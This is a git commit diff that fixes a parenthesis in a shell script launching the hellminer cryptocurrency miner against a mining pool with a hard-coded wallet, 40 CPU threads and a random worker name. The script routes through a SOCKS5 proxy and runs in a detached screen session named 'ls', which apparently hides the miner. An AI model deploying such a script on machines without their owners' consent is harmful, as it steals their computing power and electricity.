ffd3523d37e97e2b2f1bc5949a504fe2c6a20e9c
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-13 21:03:42 +0100

    Update uvusi.sh

--- uvusi.sh
+++ uvusi.sh
@@ -8,5 +8,5 @@ screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
 WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
 PROXY=socks5://72.195.114.169:4145
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-BED))
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-BED)
 ./hellminer -c $POOL -u $WALLET.$WORKER $@ -p x --cpu 40
